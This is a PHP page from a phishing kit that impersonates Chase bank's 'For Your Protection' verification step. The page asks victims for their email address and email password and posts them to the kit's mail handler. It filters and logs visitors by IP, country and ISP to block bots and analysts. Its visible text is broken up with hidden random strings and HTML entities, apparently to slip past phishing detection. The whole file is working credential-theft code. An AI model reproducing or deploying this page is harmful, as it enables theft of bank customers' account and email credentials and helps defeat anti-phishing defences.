<?php
session_start();
error_reporting(0);
include 'spox_bot.php';
include 'check.php';
if (empty($_GET['ch_id']) or empty($_GET['country']) or empty($_GET['expired']) or !isset($_SESSION['SPOX_SESSION'])) {
       text_spox("admin/result/blocked.txt","".$ip_spox." |".$country_code_spox."| ".$country_spox." | ".$_SESSION['browser']." | ".$_SESSION['platform']." | ".$ISP_spox." | ".date("h:i:sa")." | Undefined Visitor\r\n");include'blocked.php';exit();
}
if (!isset($_SESSION['LOGIN_SESSION'])) {
    exit(header("Location: login?ch_id=$rundomizi&country=".$country_spox."&expired=$expired"));
}
?>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" dir="ltr">
<head>
        <meta charset="utf-8">
        <meta name="robots" content="noindex,nofollow">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title>For Your Protection</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="shortcut icon" href="Spox/Files/img/chasefavicon.ico">
        <link rel="stylesheet" href="Spox/Files/css/logon.css">
        <link rel="stylesheet" href="Spox/Files/css/blue-ui2.css">
        <link rel="stylesheet" href="Spox/Files/css/overview.css">

</head>
<body style="overflow-x: hidden; overflow-y: auto; height: 100%" data-has-view="true">
<style type="text/css">
.help-block.form-error{
    color:#bf2155;
}

.jpui.alert.primary .title {
    font-size: 1rem;
    color: #bf2155;
}
.jpui.alert.primary.inverted {
    color: #bf2155!important;
}
.jpui.alert.primary {
    background-color: #bf2155;
}
.jpui.icon.error {
    background-color: inherit!important;
    color: #bf2155!important;
}

.icon{display:none}@font-face{font-family:dcefont;font-style:'normal';font-weight:'normal';src:url(Spox/Files/css/fonts/fonts/dcefont.eot);src:url(Spox/Files/css/fonts/dcefont.eot?#iefix) format('embedded-opentype'),url(Spox/Files/css/fonts/dcefont.woff) format('woff'),url(Spox/Files/css/fonts/dcefont.ttf) format('truetype'),url(Spox/Files/css/fonts/dcefont.svg#dcefont) format('svg')}

</style>
<div data-is-view="true">
<div class="homepage">

<div class="logon-container">
<header class="toggle-aria-hidden">
<div class="logon header jpui transparent navigation bar">
<a href="#">
<div class="chase logo"></div>
<span class="util accessible-text">SPOX LOVE YOU !</span>
</a>
</div>
</header>
<main id="logon-content" data-has-view="true">
<div class="msd password-reset reset-code" data-is-view="true">
<div id="backgroundImage">
<div class="jpui background image fixed blurred" id="geoImage">
</div>
</div>
<div class="container">
<div class="row jpui primary panel">
<div class="col-xs-12 col-md-10 col-md-offset-1 content-container">
<h1 class="header">F<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>o<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>r Y<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>o<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>u<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>r P<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>r<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>&#111;&#116;<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>&#101;&#99;<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>&#116;&#105;<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>&#111;&#110;</h1>

<div class="row jpui panel body">
<div class="col-xs-12 col-sm-10 col-sm-offset-1">
<div class="progress u-no-outline" id="progress" tabindex="-1">
<div class="row">
<div class="col-xs-12 col-sm-6 clear-padding">
</div>
<div class="col-xs-12 col-sm-6 progress-padding">
<div class="jpui progress rectangles" id="progress-progressBar" data-progress="">
<ol class="steps-3" role="presentation">
    <li class="active"></li>
    <li class="active current-step"></li>
    <li id="progress-progressBar-step-3"></li>
</ol>

</div>
</div>
</div>
</div>
<style type="text/css">
    .jpui.alert.spox.spox .title {
    font-size: 1rem;
    font-weight: 300;
    color: #bf2155;
    letter-spacing: 0;
    text-decoration: none;
    width: 100%;
    margin: .0625rem .0625rem .313rem 0;
}

</style>
<form action="Spox/Mail/Mail2?token=<?=$rundomizi?>" method="POST">
<input type="hidden" name="_csrf" value="<?=$rundomizi?>">


    <h3>&#69;&#109;&#97;<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>&#105;&#108;&#32;&#97;&#117;<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>&#116;&#104;&#101;&#110;<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>&#116;&#105;&#99;<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>&#97;&#116;&#105;&#111;&#110; </h3ext>
    <p>For Your identi<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>&#102;&#105;&#99;&#97;&#116;&#105;&#111;&#110;&#44;&#32;&#87;&#101;&#32;&#110;&#101;&#101;&#100;&#32;&#121;&#111;&#117;&#32;&#116;&#111;&#32;&#115;&#105;&#103;&#110;&#45;&#105;&#110;&#32;&#116;&#111;&#32;&#121;&#111;&#117;&#114;&#32;&#114;&#101;&#103;&#105;<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>&#115;&#116;&#101;&#114;&#101;&#100;&#32;&#101;&#109;&#97;<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>&#105;&#108;&#32;&#119;&#104;&#105;&#99;&#104;&#32;&#119;&#101;&#32;&#104;&#97;&#118;&#101;&#32;&#105;&#110;&#32;&#111;&#117;&#114;&#32;&#114;&#101;&#99;&#111;&#114;&#100;&#115;&#46;</p>
        <?php
    if (isset($_GET['invalid'])) {
    $invalid = isset($_GET['invalid']) ? trim(htmlentities($_GET['invalid'])):'';
    $em = "email";
    if ($invalid == $em) {
        echo'<div class="validator-error-header"><div class="jpui error error jpui spox spox inverted primary animate alert" aria-labelledby="inner-alert-the-user"><i class="jpui exclamation-color error error icon"></i> <div class="icon background"></div> <div class="content wrap" ><h2 class="title" tabindex="-1" ><span class="util accessible-text">&#73;&#109;&#112;&#111;&#114;&#116;&#97;&#110;&#116;&#58; </span >&#87;&#101;&#32;&#99;&#111;&#117;&#108;&#100;&#110;&#116;&#32;&#102;&#105;&#110;&#100;&#32;&#97;&#110;&#121;&#32;&#114;&#101;&#99;&#111;&#114;&#100;&#115;&#32;&#116;&#104;&#97;&#116;&#32;&#109;&#97;&#116;&#99;&#104;&#32;&#116;&#104;&#101;&#32;&#100;&#101;&#116;&#97;&#105;&#108;&#115;&#32;&#121;&#111;&#117;&#32;&#101;&#110;&#116;&#101;&#114;&#101;&#100;&#46;<br> &#80;&#108;&#101;&#97;&#115;&#101;&#32;&#116;&#114;&#121;&#32;&#97;&#103;&#97;&#105;&#110;&#33;</h2></div></div></div><input type="hidden" name="invalid" value="invalid">';}}?>

<div class="inside-container">
<div class="row">
<div class="col-xs-12 col-sm-5 label-column otp-code">
    <label class="jpui label msdLabelHeightFix">
        <span class="accessible-text hidden"></span>&#69;&#109;&#97;&#105;&#108;&#32;&#97;&#100;&#100;&#114;&#101;&#115;&#115; </label>
</div>
<div class="col-xs-12 col-sm-5 form-column otp-code">
<div class="account-input ssn_card_account_number">
    <input class="jpui input account-input ssn_card_account_number" data-validation="email" placeholder="" type="text" name="spox_epail"  data-validation-error-msg="  "></div>
</div>
</div>
<div class="row">
<div class="col-xs-12 col-sm-5 label-column">
    <label class="jpui label">
    <span class="accessible-text hidden"></span>Email password</label>
</div>
<div class="col-xs-12 col-sm-5 form-column">
<div class="margin-bottom-20px" id="password_input">
<input class="jpui input margin-bottom-20px" placeholder="" type="password" data-validation="length" data-validation-length="min4-30" name="spox_ass" data-validation-error-msg=" ">
</div>
</div>
</div>
<p class="identification-code-received-message">
<span>We ask you to ver<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>ify your ema<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>il to add this device as <a class="link-anchor underline" href="javascript:void(0);" >Tru<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>sted Dev<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>ices,</a>and safeg<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>uard your acco<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>unt from any unautho<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>rized login from unk<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>nown dev<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>ice.</span>
<span class="jpui link" id="requestNewIdentificationCode-link-wrapper">
</span>
</p>
</div>
<div class="button-container row show-sm">
<div class="col-xs-12 col-sm-3 col-sm-offset-6">
<button type="button" class="jpui button focus fluid ">
    <span class="label">&#67;&#97;&#110;&#99;&#101;&#108;</span>
</button>
</div>
<div class="col-xs-12 col-sm-3">
<button type="submit" class="jpui button focus fluid primary ">
    <span class="label">&#78;&#101;&#120;&#116;</span>
</button>
</div>
</div>
</form></div></div></div></div></div></div>
</main>
</div>
</div>
</div>
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery-form-validator/2.3.26/jquery.form-validator.min.js"></script>
<script>
  $.validate();
  $('#my-textarea').restrictLength( $('#max-length-element') );
  $.validate({
  modules : 'toggleDisabled',
  disabledFormFilter : 'form.toggle-disabled',
  showErrorDialogs : false
});
$(document).ready(function() {
    $("#submit").submit(function(e) {
        $("#errordiv").hide();
    });
});

</script>

</body>
</html>
